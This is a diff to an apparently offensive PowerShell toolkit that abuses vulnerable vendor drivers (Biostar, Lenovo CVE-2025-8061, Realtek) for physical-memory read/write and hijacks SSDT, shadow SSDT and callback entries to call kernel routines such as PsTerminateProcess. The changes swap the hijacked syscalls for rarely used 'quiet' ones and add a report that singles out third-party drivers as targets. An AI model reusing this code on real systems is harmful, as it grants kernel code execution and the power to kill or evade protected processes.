@@ -322,7 +322,7 @@ function Get-StatusString ($StatusCode) {
 # Test 1: NT Call Hijack
 $PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
 $eProc  = Query-EprocessStruct -ProcessID $PROCID
-$Result1 = Invoke-SsdtNtCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Result1 = Invoke-SsdtNtCallHijack PsTerminateProcess @($eProc, 0L)
 $Color1  = if ($Result1 -eq 0) { "Green" } else { "Red" }
 Write-Host "NtCall Hijack     -> Notepad (PID: $PROCID)"
 Write-Host "$(Get-StatusString $Result1)" -ForegroundColor $Color1
@@ -330,7 +330,7 @@ Write-Host "$(Get-StatusString $Result1)" -ForegroundColor $Color1
 # Test 2: Shadow Call Hijack
 $PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
 $eProc  = Query-EprocessStruct -ProcessID $PROCID
-$Result2 = Invoke-SsdtShadowCallHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Result2 = Invoke-SsdtShadowCallHijack PsTerminateProcess @($eProc, 0L)
 $Color2  = if ($Result2 -eq 0) { "Green" } else { "Red" }
 Write-Host "ShadowCall Hijack -> Notepad (PID: $PROCID)"
 Write-Host "$(Get-StatusString $Result2)" -ForegroundColor $Color2
@@ -338,7 +338,7 @@ Write-Host "$(Get-StatusString $Result2)" -ForegroundColor $Color2
 # Test 3: Callback Hijack
 $PROCID = Start-Process -FilePath Notepad -WindowStyle Normal -PassThru | Select-Object -ExpandProperty Id
 $eProc  = Query-EprocessStruct -ProcessID $PROCID
-$Result3 = Invoke-SsdtCallbackHijack PsTerminateProcess @($eProc, 0L, 0L)
+$Result3 = Invoke-SsdtCallbackHijack PsTerminateProcess @($eProc, 0L)
 $Color3  = if ($Result3 -eq 0) { "Green" } else { "Red" }
 Write-Host "Callback Hijack   -> Notepad (PID: $PROCID)"
 Write-Host "$(Get-StatusString $Result3)" -ForegroundColor $Color3
@@ -2179,8 +2179,8 @@ Function Invoke-MemoryOperation {
             [Marshal]::WriteInt64($InOutBuffer, 0x08, [Int64]$PayloadBuf)
         }
         'BS_LED' {
-            # Biostar BS_LED64 / BS_RVSIO — Physical memory R/W
-            # NOTE: Uses UInt32 PA — limited to physical addresses below 4 GB
+            # Biostar BS_LED64 / BS_RVSIO Physical memory R/W
+            # NOTE: Uses UInt32 PA limited to physical addresses below 4 GB
             $DeviceName    = 'BS_LED64'
             $AltDeviceName = 'BS_LED'
 
@@ -2208,7 +2208,7 @@ Function Invoke-MemoryOperation {
             }
         }
         'LnvMSRIO' {
-            # Lenovo LnvMSRIO / WinMsrDev — CVE-2025-8061
+            # Lenovo LnvMSRIO / WinMsrDev CVE-2025-8061
             # Physical memory R/W via MMIO-style unit transfer
             $DeviceName    = 'LnvMSRIO'
             $AltDeviceName = 'WinMsrDev'
@@ -2247,7 +2247,7 @@ Function Invoke-MemoryOperation {
             }
         }
         'RtsUpx' {
-            # Realtek RtsUpx — Physical memory R/W
+            # Realtek RtsUpx Physical memory R/W
             # Header: [Int64 Reserved=0, Int64 PA, Int32 Size, Int32 Reserved=0]
             $DeviceName = 'RtsUpx'
 
@@ -6512,9 +6512,9 @@ function Get-NtBuildNumber {
         [Marshal]::Copy($va, $fBuf, 0, 120)
         Unmap-VirtualAddress $va -DriverName mtxvxd | Out-Null
 
-        # ==========================================
+        # ===============================================
         # 3. Dynamic RIP-Relative Scan (Universal Fix)
-        # ==========================================
+        # ===============================================
         # Matches both Windows 10 & 11 by ensuring we grab the final validation block
         $offset = -1
         $instrLen = 6 # Opcode 8B 05 (2) + 4-byte displacement (4)
@@ -6708,10 +6708,10 @@ function Spoof-NtBuildNumber {
 Clear-Host
 Write-Host
 
-# V1, Using API, limited Info
+# v1, Using API, limited Info
 #Get-ObjectManagerDirectory -Path Device
 
-# V2, with full Driver Path
+# v2, with full Driver Path
 $Devices = Dump-ObjectDirectory -FilterPath '\Device' -AsObject
 if ($Devices) {
     $DeviceRoot = $Devices | Where-Object { $_.FullPath -eq '\Device' }
@@ -6734,6 +6734,11 @@ if ($Devices) {
         } | Format-Table -AutoSize
     }
 }
+
+# v3, Full report grouped and color-coded
+$Devices = Dump-ObjectDirectory -FilterPath '\Device' -AsObject
+#Format-DeviceDriverReport -Devices $Devices
+Format-DeviceDriverReport -Devices $Devices -ThirdPartyOnly
 #>
 function Safe-Read {
     param(
@@ -6761,11 +6766,11 @@ function Get-DriverFromDevice {
         [Parameter(Mandatory)]
         [long]$DeviceBodyAddress,
 
-        # Pre-extracted from caller's bulk read — skips the device-object IOCTL entirely
+        # Pre-extracted from caller's bulk read skips the device-object IOCTL entirely
         [long]$PreReadDriverObjectVA = 0
     )
 
-    # ── x64 offset reference ──
+    #  x64 offset reference 
     # _DEVICE_OBJECT.DriverObject          @ 0x08
     # _DRIVER_OBJECT.DriverSection         @ 0x28  (-> _KLDR_DATA_TABLE_ENTRY)
     # _DRIVER_OBJECT.DriverExtension       @ 0x30  (-> _DRIVER_EXTENSION)
@@ -6775,11 +6780,11 @@ function Get-DriverFromDevice {
     # _DRIVER_EXTENSION.ServiceKeyName     @ 0x18  (_UNICODE_STRING)
     # _OBJECT_SYMBOLIC_LINK.LinkTarget     @ 0x08  (_UNICODE_STRING)
 
-    # ─────────────────────────────────────────────────────────
-    # STEP 0 — Obtain DriverObjectVA  (0 or 1 IOCTL)
-    # ─────────────────────────────────────────────────────────
+    # 
+    # STEP 0 Obtain DriverObjectVA  (0 or 1 IOCTL)
+    # 
     if ($PreReadDriverObjectVA -ne 0) {
-        $DriverObjectVA = $PreReadDriverObjectVA          # FREE — caller already read it
+        $DriverObjectVA = $PreReadDriverObjectVA          # FREE caller already read it
     } else {
         # Fallback: read just enough to get the pointer (0x10 instead of 0x100)
         $DevHead = Safe-Read -VA $DeviceBodyAddress -BlockSize 0x10
@@ -6789,11 +6794,11 @@ function Get-DriverFromDevice {
 
     $IsValidDriverPointer = ($DriverObjectVA -ne 0L -and $DriverObjectVA -lt 0L)
 
-    # ─────────────────────────────────────────────────────────
-    # STEP 1 — Cache lookup  (0 IOCTLs on hit)
-    # ─────────────────────────────────────────────────────────
-    # Many \Device objects share the same DriverObject (e.g. all HarddiskVolumeN → volmgr).
-    # On a typical system ~200 devices but only ~70 unique drivers → ~60% cache-hit rate.
+    # 
+    # STEP 1 Cache lookup  (0 IOCTLs on hit)
+    # 
+    # Many \Device objects share the same DriverObject (e.g. all HarddiskVolumeN volmgr).
+    # On a typical system ~200 devices but only ~70 unique drivers ~60% cache-hit rate.
     if ($IsValidDriverPointer -and $script:DriverCache.ContainsKey($DriverObjectVA)) {
         return $script:DriverCache[$DriverObjectVA]
     }
@@ -6802,19 +6807,19 @@ function Get-DriverFromDevice {
     $ResolvedVia = $null
 
     if ($IsValidDriverPointer) {
-        # ─────────────────────────────────────────────────────
-        # STEP 2 — Read DriverObject: 0x50 bytes  (1 IOCTL)
-        # ─────────────────────────────────────────────────────
+        # 
+        # STEP 2 Read DriverObject: 0x50 bytes  (1 IOCTL)
+        # 
         # Extended from 0x40 to 0x50 so DriverName._UNICODE_STRING.Buffer (at 0x40)
-        # is captured in-buffer — eliminates a separate struct read for the DriverName fallback.
+        # is captured in-buffer eliminates a separate struct read for the DriverName fallback.
         $DriverObjBuf = Safe-Read -VA $DriverObjectVA -BlockSize 0x50
         if ($null -ne $DriverObjBuf) {
             $DriverSectionVA   = [BitConverter]::ToInt64($DriverObjBuf, 0x28)
             $DriverExtensionVA = [BitConverter]::ToInt64($DriverObjBuf, 0x30)
 
-            # ─────────────────────────────────────────────────
-            # STEP 3 — Bulk-read FullDllName + BaseDllName structs  (1 IOCTL)
-            # ─────────────────────────────────────────────────
+            # 
+            # STEP 3 Bulk-read FullDllName + BaseDllName structs  (1 IOCTL)
+            # 
             # FullDllName@0x48 and BaseDllName@0x58 are adjacent _UNICODE_STRINGs.
             # One 0x20-byte read captures BOTH struct headers; only the string
             # buffer itself needs a separate IOCTL.
@@ -6822,23 +6827,23 @@ function Get-DriverFromDevice {
                 $NamesBlk = Safe-Read -VA ($DriverSectionVA + 0x48) -BlockSize 0x20
                 if ($null -ne $NamesBlk) {
 
-                    # ── 3a: FullDllName (best: full on-disk path) ──
+                    #  3a: FullDllName (best: full on-disk path) 
                     $fLen = [BitConverter]::ToUInt16($NamesBlk, 0)
                     $fBuf = [BitConverter]::ToInt64($NamesBlk, 8)
                     if ($fBuf -ne 0L -and $fLen -gt 0 -and $fLen -lt 1024) {
-                        $raw = Safe-Read -VA $fBuf -BlockSize $fLen          # 1 IOCTL — string buffer
+                        $raw = Safe-Read -VA $fBuf -BlockSize $fLen          # 1 IOCTL string buffer
                         if ($null -ne $raw) {
                             try   { $DriverPath = [Text.Encoding]::Unicode.GetString($raw); $ResolvedVia = 'FullDllName' }
                             catch {}
                         }
                     }
 
-                    # ── 3b: BaseDllName fallback (file name only) — struct already in buffer ──
+                    #  3b: BaseDllName fallback (file name only) struct already in buffer 
                     if ([string]::IsNullOrEmpty($DriverPath)) {
                         $bLen = [BitConverter]::ToUInt16($NamesBlk, 0x10)
                         $bBuf = [BitConverter]::ToInt64($NamesBlk, 0x18)
                         if ($bBuf -ne 0L -and $bLen -gt 0 -and $bLen -lt 1024) {
-                            $raw = Safe-Read -VA $bBuf -BlockSize $bLen      # 1 IOCTL — string buffer
+                            $raw = Safe-Read -VA $bBuf -BlockSize $bLen      # 1 IOCTL string buffer
                             if ($null -ne $raw) {
                                 try   { $DriverPath = [Text.Encoding]::Unicode.GetString($raw); $ResolvedVia = 'BaseDllName' }
                                 catch {}
@@ -6848,12 +6853,12 @@ function Get-DriverFromDevice {
                 }
             }
 
-            # ── STEP 4: DriverName fallback — struct parsed from Step 2 buffer, 0 extra struct IOCTLs ──
+            #  STEP 4: DriverName fallback struct parsed from Step 2 buffer, 0 extra struct IOCTLs 
             if ([string]::IsNullOrEmpty($DriverPath)) {
                 $dnLen = [BitConverter]::ToUInt16($DriverObjBuf, 0x38)
                 $dnBuf = [BitConverter]::ToInt64($DriverObjBuf, 0x40)   # captured because we read 0x50
                 if ($dnBuf -ne 0L -and $dnLen -gt 0 -and $dnLen -lt 1024) {
-                    $raw = Safe-Read -VA $dnBuf -BlockSize $dnLen        # 1 IOCTL — string buffer only
+                    $raw = Safe-Read -VA $dnBuf -BlockSize $dnLen        # 1 IOCTL string buffer only
                     if ($null -ne $raw) {
                         try   { $DriverPath = [Text.Encoding]::Unicode.GetString($raw); $ResolvedVia = 'DriverName' }
                         catch {}
@@ -6861,7 +6866,7 @@ function Get-DriverFromDevice {
                 }
             }
 
-            # ── STEP 5: ServiceKeyName — last resort  (1 struct IOCTL + 1 buffer IOCTL) ──
+            #  STEP 5: ServiceKeyName last resort  (1 struct IOCTL + 1 buffer IOCTL) 
             if ([string]::IsNullOrEmpty($DriverPath) -and $DriverExtensionVA -ne 0L) {
                 $svcBlk = Safe-Read -VA ($DriverExtensionVA + 0x18) -BlockSize 16
                 if ($null -ne $svcBlk) {
@@ -6885,9 +6890,9 @@ function Get-DriverFromDevice {
         }
     }
 
-    # ─────────────────────────────────────────────────────────
+    # 
     # SYMLINK FALLBACK  (only if DriverObject invalid/unresolvable)
-    # ─────────────────────────────────────────────────────────
+    # 
     if (-not $IsValidDriverPointer -or [string]::IsNullOrEmpty($DriverPath)) {
         $lnkBlk = Safe-Read -VA ($DeviceBodyAddress + 0x08) -BlockSize 16
         if ($null -ne $lnkBlk) {
@@ -6924,7 +6929,7 @@ function Get-DriverFromDevice {
         FullName = $DriverPath
     }
 
-    # ── Cache for all future devices sharing this DriverObject ──
+    #  Cache for all future devices sharing this DriverObject 
     if ($IsValidDriverPointer) {
         $script:DriverCache[$DriverObjectVA] = $result
     }
@@ -6943,11 +6948,11 @@ function Dump-ObjectDirectory {
     if ($IndentLevel -eq 0) {
         $script:VisitedDirectories = [System.Collections.Generic.HashSet[long]]::new()
 
-        # ── Driver resolution cache — shared across entire traversal ──
+        #  Driver resolution cache shared across entire traversal 
         $script:DriverCache = @{}
         $script:DriverCacheHits = 0
 
-        # ── Pre-built HashSet replaces per-iteration array allocation ──
+        #  Pre-built HashSet replaces per-iteration array allocation 
         $script:KnownDirs = [System.Collections.Generic.HashSet[string]]::new(
             [string[]]@("\Device", "\Driver", "\GLOBAL??", "\REGISTRY", "\ObjectTypes", "\Security", "\Callback", "\Sessions"),
             [System.StringComparer]::OrdinalIgnoreCase
@@ -6974,10 +6979,10 @@ function Dump-ObjectDirectory {
     $Indent = "  " * $IndentLevel
     $CollectedItems = [System.Collections.Generic.List[PSCustomObject]]::new()
 
-    # Cache this check — it's the same for every entry in this directory level
+    # Cache this check it's the same for every entry in this directory level
     $IsDeviceParent = ($ParentPath -eq "\Device")
 
-    # ── OPTIMIZATION: Single bulk read for all 37 directory buckets (37 * 8 = 296 bytes) ──
+    #  OPTIMIZATION: Single bulk read for all 37 directory buckets (37 * 8 = 296 bytes) 
     $DirectoryBucketsBytes = Safe-Read -VA $DirAddress -BlockSize 296
     if ($null -eq $DirectoryBucketsBytes) {
         return
@@ -6998,7 +7003,7 @@ function Dump-ObjectDirectory {
             }
             $ChainTracker.Add($EntryAddress) | Out-Null
 
-            # ── Read _OBJECT_DIRECTORY_ENTRY (16 bytes) — 1 IOCTL ──
+            #  Read _OBJECT_DIRECTORY_ENTRY (16 bytes) 1 IOCTL 
             $EntryBytes = Safe-Read -VA $EntryAddress -BlockSize 16
             if ($null -eq $EntryBytes) {
                 if (-not $AsObject) {
@@ -7011,7 +7016,7 @@ function Dump-ObjectDirectory {
             $ObjectBody = [BitConverter]::ToInt64($EntryBytes, 8)
             $ObjectHeaderVA = $ObjectBody - 0x30
 
-            # ── OPTIMIZATION: Extended bulk header read — 0x80 instead of 0x70 ──
+            #  OPTIMIZATION: Extended bulk header read 0x80 instead of 0x70 
             # The extra 0x10 bytes capture ObjectBody[0x00..0x0F], which includes
             # _DEVICE_OBJECT.DriverObject @ +0x08 = BulkBytes[0x78].
             # This eliminates the first read inside Get-DriverFromDevice for \Device objects.
@@ -7058,7 +7063,7 @@ function Dump-ObjectDirectory {
             # Build absolute path
             $CurrentPath = if ($ParentPath -eq "\") { "\$ObjectName" } else { "$ParentPath\$ObjectName" }
 
-            # ── Early path-tree filter (already existed — keeps it) ──
+            #  Early path-tree filter (already existed keeps it) 
             $MatchesFilter = $true
             if ($FilterPath) {
                 $MatchesFilter = $CurrentPath.StartsWith($FilterPath, [System.StringComparison]::OrdinalIgnoreCase) -or
@@ -7073,11 +7078,11 @@ function Dump-ObjectDirectory {
             $HexEntry = "0x{0:X16}" -f $EntryAddress
             $HexBody  = "0x{0:X16}" -f $ObjectBody
 
-            # ── OPTIMIZATION: HashSet.Contains instead of array -contains per iteration ──
+            #  OPTIMIZATION: HashSet.Contains instead of array -contains per iteration 
             $IsDirectory = ($script:KnownDirs.Contains($CurrentPath) -and $CurrentPath -ne "\REGISTRY") -or
                            ($ObjectName -eq "Sessions")
 
-            # ── OPTIMIZATION: Extract DriverObjectVA from the extended bulk read ──
+            #  OPTIMIZATION: Extract DriverObjectVA from the extended bulk read 
             # ObjectBody starts at BulkBytes[0x70]; DriverObject pointer is at body+0x08 = [0x78]
             # This value is passed to Get-DriverFromDevice so it skips its own device-object read.
             $PreDriverObjVA = 0L
@@ -7137,6 +7142,177 @@ function Dump-ObjectDirectory {
 
     if ($AsObject) {
         return $CollectedItems.ToArray()
+    }
+}
+function Format-DeviceDriverReport {
+    <#
+    .SYNOPSIS
+        Pretty-prints Dump-ObjectDirectory results grouped by driver,
+        with third-party drivers highlighted and unnamed device noise collapsed.
+    .PARAMETER Devices
+        The root object from Dump-ObjectDirectory -FilterPath '\Device' -AsObject
+    .PARAMETER ShowAll
+        Include unnamed numeric devices (00000001, etc.) individually instead of collapsing them.
+    .PARAMETER ThirdPartyOnly
+        Show only non-Microsoft / non-inbox drivers.
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        $Devices,
+
+        [switch]$ShowAll,
+        [switch]$ThirdPartyOnly
+    )
+
+    $DeviceRoot = $Devices | Where-Object { $_.FullPath -eq '\Device' }
+    if (-not $DeviceRoot -or -not $DeviceRoot.Children) {
+        Write-Warning "No \Device children found."
+        return
+    }
+
+    # Collect all device entries that have driver details
+    $Entries = $DeviceRoot.Children | Where-Object {
+        $_.DriverDetails -and $_.DriverDetails.FullName -ne '<No Driver Details>'
+    }
+
+    # Group by driver path
+    $Groups = $Entries | Group-Object { $_.DriverDetails.FullName } | Sort-Object Name
+
+    $Results = foreach ($g in $Groups) {
+        $driverPath = $g.Name
+        $devices    = $g.Group
+
+        # Split named vs unnamed (hex-numbered) devices
+        $named   = $devices | Where-Object { $_.Name -notmatch '^\d{8}$' -and $_.Name -notmatch '^<' }
+        $unnamed = $devices | Where-Object { $_.Name -match '^\d{8}$' -or $_.Name -match '^<' }
+
+        # Classify
+        $isThirdParty = $driverPath -like '\??\*'
+        $isSymLink    = $driverPath -like '-> SymLink:*'
+        $isUnknown    = $driverPath -eq '<Unknown Path>'
+
+        $category = if ($isThirdParty)    { 'ThirdParty' }
+                    elseif ($isSymLink)    { 'SymLink' }
+                    elseif ($isUnknown)    { 'Unknown' }
+                    else                  { 'System' }
+
+        # Extract just the filename
+        $fileName = if ($driverPath -match '\\([^\\]+)$') { $Matches[1] } else { $driverPath }
+
+        [PSCustomObject]@{
+            Category     = $category
+            DriverFile   = $fileName
+            DriverPath   = $driverPath
+            NamedDevices = @($named | ForEach-Object { $_.Name })
+            UnnamedCount = @($unnamed).Count
+            TotalDevices = $devices.Count
+            IsThirdParty = $isThirdParty
+        }
+    }
+
+    if ($ThirdPartyOnly) {
+        $Results = $Results | Where-Object { $_.IsThirdParty }
+    }
+
+    # -- Summary header --
+    $totalDrivers    = $Results.Count
+    $thirdPartyCount = @($Results | Where-Object { $_.IsThirdParty }).Count
+    $totalDevices    = ($Results | Measure-Object -Property TotalDevices -Sum).Sum
+
+    Write-Host ""
+    Write-Host "+--------------------------------------------------------------+" -ForegroundColor DarkCyan
+    Write-Host "|  Device <-> Driver Map                                       |" -ForegroundColor DarkCyan
+    Write-Host "|  $totalDrivers drivers | $totalDevices devices | $thirdPartyCount third-party$(if($ThirdPartyOnly){' (filtered)'})" -ForegroundColor DarkCyan -NoNewline
+    Write-Host "$(' ' * [Math]::Max(0, 30 - "$thirdPartyCount third-party".Length))|" -ForegroundColor DarkCyan
+    Write-Host "+--------------------------------------------------------------+" -ForegroundColor DarkCyan
+    Write-Host ""
+
+    # -- Third-party drivers (the interesting ones) --
+    $thirdParty = $Results | Where-Object { $_.IsThirdParty }
+    if ($thirdParty) {
+        Write-Host "  [!] THIRD-PARTY DRIVERS (loaded from disk)" -ForegroundColor Red
+        Write-Host "  -----------------------------------------" -ForegroundColor DarkGray
+        foreach ($drv in $thirdParty) {
+            Write-Host "    * " -ForegroundColor Yellow -NoNewline
+            Write-Host $drv.DriverFile -ForegroundColor White -NoNewline
+            Write-Host "  <-  " -ForegroundColor DarkGray -NoNewline
+            Write-Host $drv.DriverPath -ForegroundColor DarkYellow
+
+            foreach ($dev in $drv.NamedDevices) {
+                Write-Host "      |-- " -ForegroundColor DarkGray -NoNewline
+                Write-Host "\\.\$dev" -ForegroundColor Green
+            }
+            if ($drv.UnnamedCount -gt 0) {
+                Write-Host "      \-- " -ForegroundColor DarkGray -NoNewline
+                Write-Host "+$($drv.UnnamedCount) unnamed device(s)" -ForegroundColor DarkGray
+            }
+            Write-Host ""
+        }
+    }
+
+    if ($ThirdPartyOnly) { return }
+
+    # -- System drivers (grouped, compact) --
+    $system = $Results | Where-Object { $_.Category -eq 'System' } | Sort-Object DriverFile
+    if ($system) {
+        Write-Host "  [=] SYSTEM DRIVERS" -ForegroundColor Cyan
+        Write-Host "  -----------------------------------------" -ForegroundColor DarkGray
+
+        foreach ($drv in $system) {
+            $namedList = if ($drv.NamedDevices.Count -gt 0) {
+                $drv.NamedDevices -join ', '
+            } else { '' }
+
+            $suffix = if ($drv.UnnamedCount -gt 0 -and $namedList) {
+                " (+$($drv.UnnamedCount))"
+            } elseif ($drv.UnnamedCount -gt 0) {
+                "$($drv.UnnamedCount) unnamed"
+            } else { '' }
+
+            # Compact: one line per driver
+            $displayDevices = "$namedList$suffix"
+            if ($displayDevices.Length -gt 70) {
+                $displayDevices = $displayDevices.Substring(0, 67) + '...'
+            }
+
+            Write-Host "    " -NoNewline
+            Write-Host ("{0,-38}" -f $drv.DriverFile) -ForegroundColor Gray -NoNewline
+            Write-Host $displayDevices -ForegroundColor DarkGray
+        }
+        Write-Host ""
+    }
+
+    # -- SymLinks --
+    $symlinks = $Results | Where-Object { $_.Category -eq 'SymLink' }
+    if ($symlinks) {
+        Write-Host "  [~] SYMBOLIC LINKS" -ForegroundColor Magenta
+        Write-Host "  -----------------------------------------" -ForegroundColor DarkGray
+        foreach ($drv in $symlinks) {
+            $target = $drv.DriverPath -replace '-> SymLink: ', ''
+            foreach ($dev in $drv.NamedDevices) {
+                Write-Host "    $dev" -ForegroundColor DarkMagenta -NoNewline
+                Write-Host "  -->  " -ForegroundColor DarkGray -NoNewline
+                Write-Host $target -ForegroundColor DarkGray
+            }
+        }
+        Write-Host ""
+    }
+
+    # -- Unknown --
+    $unknown = $Results | Where-Object { $_.Category -eq 'Unknown' }
+    if ($unknown) {
+        Write-Host "  [?] UNRESOLVED (no driver path)" -ForegroundColor DarkYellow
+        Write-Host "  -----------------------------------------" -ForegroundColor DarkGray
+        foreach ($drv in $unknown) {
+            foreach ($dev in $drv.NamedDevices) {
+                Write-Host "    ? $dev" -ForegroundColor DarkYellow
+            }
+            if ($drv.UnnamedCount -gt 0) {
+                Write-Host "    ? +$($drv.UnnamedCount) unnamed" -ForegroundColor DarkGray
+            }
+        }
+        Write-Host ""
     }
 }
 function Get-ObjectManagerDirectory {
@@ -7462,22 +7638,19 @@ Function Invoke-SsdtCallbackHijack {
 
     $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
     switch ($ParamCount) {
-        0  { $Hook = "NtUserGetForegroundWindow"   }
-        1  { $Hook = "NtUserGetKeyboardState"      }
-        2  { $Hook = "NtUserGetKeyboardLayoutList" }
-        3  { $Hook = "NtUserGetControlBrush"       }
-        4  { $Hook = "NtUserGetControlColor"       }
-        5  { $Hook = "NtUserDrawMenuBarTemp"       }
-        6  { $Hook = "NtUserGetAltTabInfo"         }
-        7  { $Hook = "NtUserToUnicodeEx"           }
-        8  { $Hook = "NtUserSetWinEventHook"       }
-        9  { $Hook = "NtUserInitTask"              }
-        10 { $Hook = "NtUserInitTask"              }
-        11 { $Hook = "NtUserInitTask"              }
-        12 { $Hook = "NtUserInitTask"              }
-        default {
-            Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
-        }
+        0  { $Hook = "NtUserGetCaretBlinkTime"         }  # 0 params  — almost never queried
+        1  { $Hook = "NtGdiPathToRegion"               }  # 1 param   — legacy GDI, rare
+        2  { $Hook = "NtUserGetPriorityClipboardFormat"}  # 2 params  — legacy clipboard
+        3  { $Hook = "NtUserGetClipboardFormatName"    }  # 3 params  — rarely hit
+        4  { $Hook = "NtUserMapVirtualKeyEx"           }  # 4 params  — rarely direct-called
+        5  { $Hook = "NtUserGetMouseMovePointsEx"      }  # 5 params  — almost dead API
+        6  { $Hook = "NtGdiAngleArc"                   }  # 6 params  — legacy GDI
+        7  { $Hook = "NtUserToUnicodeEx"               }  # 7 params  — keep, quiet enough
+        8  { $Hook = "NtUserScrollWindowEx"            }  # 8 params  — rarely direct syscall
+        9  { $Hook = "NtGdiGetDIBitsInternal"          }  # 9 params  — rare direct call
+        10 { $Hook = "NtGdiArcInternal"                }  # 10 params — legacy GDI arc
+        11 { $Hook = "NtGdiPlgBlt"                     }  # 11 params — essentially dead
+        12 { $Hook = "NtGdiStretchBlt"                 }  # 12 params — nobody calls NtGdi directly
     }
 
     $osBuild = [Marshal]::ReadInt32(0x7FFE0000, 0x260)
@@ -7581,25 +7754,22 @@ Function Invoke-SsdtShadowCallHijack {
 
     $ParamCount = if ($Values -eq $null) { 0 } else { $Values.Length }
     switch ($ParamCount) {
-        0  { $Hook = "NtUserGetForegroundWindow"   }
-        1  { $Hook = "NtUserGetKeyboardState"      }
-        2  { $Hook = "NtUserGetKeyboardLayoutList" }
-        3  { $Hook = "NtUserGetControlBrush"       }
-        4  { $Hook = "NtUserGetControlColor"       }
-        5  { $Hook = "NtUserDrawMenuBarTemp"       }
-        6  { $Hook = "NtUserGetAltTabInfo"         }
-        7  { $Hook = "NtUserToUnicodeEx"           }
-        8  { $Hook = "NtUserSetWinEventHook"       }
-        9  { $Hook = "NtUserInitTask"              }
-        10 { $Hook = "NtUserInitTask"              }
-        11 { $Hook = "NtUserInitTask"              }
-        12 { $Hook = "NtUserInitTask"              }
-        default {
-            Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
-        }
+        0  { $Hook = "NtUserGetCaretBlinkTime"         }  # 0 params  — almost never queried
+        1  { $Hook = "NtGdiPathToRegion"               }  # 1 param   — legacy GDI, rare
+        2  { $Hook = "NtUserGetPriorityClipboardFormat"}  # 2 params  — legacy clipboard
+        3  { $Hook = "NtUserGetClipboardFormatName"    }  # 3 params  — rarely hit
+        4  { $Hook = "NtUserMapVirtualKeyEx"           }  # 4 params  — rarely direct-called
+        5  { $Hook = "NtUserGetMouseMovePointsEx"      }  # 5 params  — almost dead API
+        6  { $Hook = "NtGdiAngleArc"                   }  # 6 params  — legacy GDI
+        7  { $Hook = "NtUserToUnicodeEx"               }  # 7 params  — keep, quiet enough
+        8  { $Hook = "NtUserScrollWindowEx"            }  # 8 params  — rarely direct syscall
+        9  { $Hook = "NtGdiGetDIBitsInternal"          }  # 9 params  — rare direct call
+        10 { $Hook = "NtGdiArcInternal"                }  # 10 params — legacy GDI arc
+        11 { $Hook = "NtGdiPlgBlt"                     }  # 11 params — essentially dead
+        12 { $Hook = "NtGdiStretchBlt"                 }  # 12 params — nobody calls NtGdi directly
     }
 
-    # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write“ Exploit Pack
+    # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write Exploit Pack
     # https://www.exploitpack.com/blogs/news/shadow-ssdt-hijacking-to-achieve-kernel-code-execution-via-rw-primitives
 
     # Notepad++, Regex Search
@@ -7623,7 +7793,7 @@ Function Invoke-SsdtShadowCallHijack {
     $TableAddress = [IntPtr]::Add($KerBase, $RVA)
 
     # Extract the Index and the Selector
-    $Selector  = ($SysCall -shr 12) -band 0xF # The '1' in 0x1021
+    $Selector  = ($SysCall -shr 12) -band 0xF # The '1'    in 0x1021
     $Index     = $SysCall -band 0xFFF         # The '0x21' in 0x1021
 
     # Descriptor 0 = System Service Table (ntoskrnl)
